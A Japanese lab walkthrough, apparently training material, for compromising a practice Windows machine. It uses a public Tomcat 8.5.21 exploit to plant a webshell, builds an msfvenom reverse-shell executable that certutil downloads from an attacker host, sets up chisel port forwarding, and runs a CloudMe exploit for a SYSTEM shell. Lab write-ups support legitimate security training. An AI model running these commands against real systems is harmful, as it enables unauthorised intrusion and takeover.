machine3で学べることは以下のことです。

- public exploitの利用
- ポートフォワーディング
- インストールされているサービスを悪用した権限昇格
- おすすめ視聴タイミング: テキストを読み終わった後、もしくはいつでも

# 攻略の流れ
#### Enumeration
nmapを用いてportscanを行います。

今回は-Pnオプションをつけていますが、これはNmapのHost discoveryという機能をスキップするものです。
```
$ nmap -Pn machine3  
```
次に開いていることがわかったポートに対してより詳細なスキャンを行います。

-sCと-sVオプションの他に、先ほども使用した-Pnオプションと-oオプションを使っています。

-oオプションを用いることによってスキャン結果をファイルに出力することができ、後から簡単に見返すことができます。
```
$ nmap -p135,139,445,8009,8080 -sC -sV -Pn -o scan/nmap-first machine3
```
nmapの結果とブラウザでアクセスした結果から8080でApache Tomcat 8.5.21が動作していることがわかります。

searchsploitを使ってtomcatに関するpublic exploitがないかを調査します。
```
$ searchsploit tomcat 8.5.21
```
Initial Shell  
2つのexploitが見つかりましたが、pythonスクリプトである42966.pyを見てみます。
```
$ searchsploit -m 42966.py  
$ less 42966.py
```
exploitの内容を読んで概要を理解し、使い方にしたがってexploitを実行するとターゲットが脆弱であることがわかります。

-pwnオプションを付与してexploitを実行するとwebshellをアップロードし、それにアクセスすることでコマンドを実行できるようになります。

コマンドが実行できるようになったので、リバースシェルを獲得します。

今回はmsfvenomを使ってバイナリを作成し、それを実行する手法を取ります。
```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=LHOST lport=LPORT -f exe -o shell.exe  
```
pythonでhttpサーバを建てます。
```
$ python3 -m http.server 80 
```
certutilコマンドでファイルをダウンロードします。
```
$ certutil -urlcache -f http://LHOST/shell.exe C:\windows\temp\shell.exe
```
ncコマンドでシェルを待ち受けたら、shell.exeを実行します。
```
$ C:\windows\temp\shell.exe
```
### Enumeration(権限昇格)
インストールされているアプリを確認するため、C:\Program Files (x86)を確認すると、CloudMeというアプリが見つかります。

これについて調べると、public exploitが見つかります。
```
$ searchsploit cloudme
```
Privilege Escalation
バージョン情報などはわかりませんが、ターゲットマシン上のタイムスタンプとexploitの作成日時を比較して刺さりそうなexploitを見つけます。
```
$ searchsploit -m 48389.py
```
exploitの内容を読むと、シェルコードを生成する必要があることがわかります。

シェルコードを生成するコマンドの例はexploitに書いてあるので、その一部を修正して実行します。
```
$ msfvenom -p windows/shell_reverse_tcp lhost=[LOST] lport=[LPORT] -b '\x00\x0A\x0D' -f python -v payload
```  
また、ターゲットとなるポートは8888ですが、これは内部にしか公開されていないためポートホワーディングを行います。
```
$ netstat -ano | findstr 8888
```
今回はchiselというツールを使っていますが、他にも様々なツールがあります。

Kali上で
```
$ chisel_linux server --reverse --port 8000
```
Windows上で
```
$ chisel_windows_intel.exe client LHOST:8000 R:8888:127.0.0.1:8888
```
これによってKaliの8888にアクセスするとターゲットの8888に転送されるようになりました。

ncコマンドでシェルを待ち受け、exploitを実行するとsystemシェルが獲得できます。
```
$ python3 48389.py
```